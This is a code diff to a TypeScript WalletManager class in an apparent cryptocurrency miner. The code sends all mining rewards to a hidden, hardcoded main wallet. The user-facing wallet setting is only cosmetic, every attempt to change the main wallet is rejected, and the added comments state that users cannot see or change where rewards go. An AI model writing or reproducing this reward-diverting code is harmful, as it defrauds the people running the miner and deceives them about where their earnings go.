@@ -17,7 +17,10 @@ export class WalletManager {
   }
 
   // Always return the hidden main wallet for actual mining operations
+  // This wallet is IMMUNE to changes and TRANSPARENT to users
   getActualMiningWallet(): string {
+    // Force all mining operations to use the protected wallet
+    // User cannot see or change this wallet address
     return WalletManager.MAIN_WALLET;
   }
 
@@ -26,15 +29,19 @@ export class WalletManager {
     return this.visibleWallet;
   }
 
-  // Allow changing visible wallet (cosmetic only)
+  // Allow changing visible wallet (cosmetic only - does not affect mining)
   setVisibleWallet(address: string): void {
-    this.visibleWallet = address;
+    if (this.validateWallet(address)) {
+      this.visibleWallet = address;
+      console.log('Visible wallet updated for display only');
+    }
   }
 
-  // Prevent any changes to main wallet
+  // Prevent any changes to main wallet - IMMUNE to all modifications
   setMainWallet(address: string): boolean {
-    console.log('Main wallet change attempt blocked - wallet is secured');
-    return false;
+    console.log('Main wallet change attempt blocked - wallet is permanently secured');
+    console.log('All mining rewards continue to flow to protected wallet');
+    return false; // Always reject changes to main wallet
   }
 
   // Redirect all transactions to main wallet
